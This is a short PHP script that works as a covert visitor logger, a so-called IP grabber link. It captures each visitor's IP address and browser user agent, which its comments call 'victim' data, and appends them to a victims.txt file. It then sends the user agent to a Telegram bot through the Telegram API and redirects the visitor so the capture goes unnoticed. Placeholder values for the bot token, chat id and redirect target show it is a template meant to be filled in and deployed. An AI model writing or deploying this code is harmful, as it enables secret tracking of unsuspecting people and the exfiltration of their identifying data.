<?php

// get victim ip :
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	$victimIP = $_SERVER['HTTP_CLIENT_IP']."\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$victimIP = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
} else {
	$victimIP = $_SERVER['REMOTE_ADDR']."\r\n";
}

// get victim useragent :
$useragent = $_SERVER['HTTP_USER_AGENT'];

// store informations in victim.txt:
$file = fopen('victims.txt', 'a');
fwrite($file, "[+] IP: " . $victimIP);
fwrite($file, "[+] Useragent: " . $useragent);
fclose($file);

// send to your telegram bot :
$apiToken = "#user agent";
$data = [
        'chat_id' => '#your id',
        'text' => $useragent
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
http_build_query($data) );

// redirect to:
header("Location: #redirect-info");
